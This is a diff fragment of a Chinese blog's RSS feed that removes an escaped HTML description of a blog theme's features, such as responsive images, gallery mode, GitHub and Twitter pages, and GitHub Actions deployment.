-&lt;/div>&lt;p>图片部分支持自动添加 &lt;code>srcset&lt;/code> 部分，SEO+++，支持懒加载，默认有加载动画，自动添加 &lt;code>ALT&lt;/code> 属性，支持图片查看缩放动画&lt;/p>
-&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
-&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#ff79c6">img&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#50fa7b">width&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;800&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#50fa7b">height&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;617&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#50fa7b">data-zoomable&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#50fa7b">data-lazyload&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#50fa7b">alt&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;左侧选择【朗读内容】，点击系统声音&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#50fa7b">class&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;medium-zoom-image entered loaded&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#50fa7b">data-ll-status&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;loaded&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#50fa7b">srcset&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;2021/07/31/1459.html/1630060151397631_hu3dcef8126cf1a840a0279e998069a100_52511_640x0_resize_catmullrom_3.png 640w, 2021/07/31/1459.html/1630060151397631_hu3dcef8126cf1a840a0279e998069a100_52511_1080x0_resize_catmullrom_3.png 1080w&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#50fa7b">src&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;2021/07/31/1459.html/1630060151397631.png&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>
-&lt;h3 class="group " id="画廊模式"
->画廊模式&lt;a href="#%e7%94%bb%e5%bb%8a%e6%a8%a1%e5%bc%8f"
->&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
->&lt;/h3>
-&lt;p>支持画廊模式，语法来自 &lt;a
-class="link"
-href="https://typlog.com/"target="_blank" rel="noopener">Typlog&lt;/a
->
-&lt;/p>
-&lt;div class="gallery-box">
-&lt;p> &lt;/p>
-&lt;p> &lt;/p>
-&lt;/div>
-&lt;h3 class="group " id="标签和分类页面"
->标签和分类页面&lt;a href="#%e6%a0%87%e7%ad%be%e5%92%8c%e5%88%86%e7%b1%bb%e9%a1%b5%e9%9d%a2"
->&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
->&lt;/h3>
-&lt;p>&lt;a
-class="link"
-href="https://imiku.me/tags/">标签页面&lt;/a
->
-和&lt;a
-class="link"
-href="https://imiku.me/categories/">分类页面&lt;/a
->
-&lt;/p>
-&lt;p>&lt;/p>
-&lt;h3 class="group " id="说说类型文章"
->说说类型文章&lt;a href="#%e8%af%b4%e8%af%b4%e7%b1%bb%e5%9e%8b%e6%96%87%e7%ab%a0"
->&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
->&lt;/h3>
-&lt;p>根据文章类型，判断应该显示什么样的卡片&lt;/p>
-&lt;p>&lt;/p>
-&lt;h3 class="group " id="友情链接页面"
->友情链接页面&lt;a href="#%e5%8f%8b%e6%83%85%e9%93%be%e6%8e%a5%e9%a1%b5%e9%9d%a2"
->&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
->&lt;/h3>
-&lt;p>支持链接语法，可用于&lt;a
-class="link"
-href="https://imiku.me/links/">友情链接页面&lt;/a
->
-&lt;/p>
-&lt;p>&lt;/p>
-&lt;h3 class="group " id="github-项目展示"
->GitHub 项目展示&lt;a href="#github-%e9%a1%b9%e7%9b%ae%e5%b1%95%e7%a4%ba"
->&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
->&lt;/h3>
-&lt;p>自动抓取 GItHub 上的项目，并根据 star 数量排名，生成&lt;a
-class="link"
-href="https://imiku.me/github/">GitHub 项目页面&lt;/a
->
-&lt;/p>
-&lt;p>&lt;/p>
-&lt;h3 class="group " id="归档页面"
->归档页面&lt;a href="#%e5%bd%92%e6%a1%a3%e9%a1%b5%e9%9d%a2"
->&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
->&lt;/h3>
-&lt;p>自动生成漂亮的&lt;a
-class="link"
-href="https://imiku.me/archives/">时间轴归档页面&lt;/a
->
-&lt;/p>
-&lt;p>&lt;/p>
-&lt;h3 class="group " id="twitter-动态页面"
->Twitter 动态页面&lt;a href="#twitter-%e5%8a%a8%e6%80%81%e9%a1%b5%e9%9d%a2"
->&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
->&lt;/h3>
-&lt;p>支持同步 &lt;a
-class="link"
-href="https://imiku.me/twitter/">Twitter 动态的更新页面&lt;/a
->
-，抓取 Twitter 上的图片和视频资源到本地，并使用 &lt;a
-class="link"
-href="https://www.jsdelivr.com/"target="_blank" rel="noopener">jsDelivr&lt;/a
->
-CDN 防止大陆地区无法访问图片的问题&lt;/p>
-&lt;p>&lt;/p>
-&lt;h3 class="group " id="github-actions-支持"
->GitHub Actions 支持&lt;a href="#github-actions-%e6%94%af%e6%8c%81"
->&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
->&lt;/h3>
-&lt;p>支持 GitHub Actions 自动部署，只需要安静的写文章，剩下的交给 Actions 完成就行，打包完后自动上传到 GitHub Pages 上，自动更新和下载 GitHub 和 Twitter 页面数据，并且自动转换资源链接到 &lt;a
-class="link"
-href="https://www.jsdelivr.com/"target="_blank" rel="noopener">jsDelivr&lt;/a
->
-CDN，加快站点访问速度&lt;/p>
-&lt;p>&lt;/p>
-&lt;p>其他特性：&lt;/p>
-&lt;ul>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> 分类、标签页面&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> 文章阅读时间&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> 网站运行时间&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a
-class="link"
-href="https://imiku.me/index.xml">RSS&lt;/a
->
-自动生成&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a
-class="link"
-href="https://imiku.me/sitemap.xml">Sitemap&lt;/a
->
-自动生成&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> i18N 多语言博客&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> 页面无刷新加载，自带进度条&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> 文章 TOC&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> 图片渐进式加载&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> 自动 WEBP 支持&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> 响应式图片&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> PWA 支持&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> 文章更新时间&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> 夜间模式&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> 语言切换&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> AMP 支持&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> 分享功能&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> 阅读进度条&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> 评论系统&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> 文章编辑器&lt;/li>
-&lt;/ul>
-&lt;p>因为目前主题处于开发阶段，还有一些BUG等待被发现和解决，待稳定后将会开源至 GitHub&lt;/p></description></item></channel></rss>
+&lt;p>&lt;/p></description></item></channel></rss>
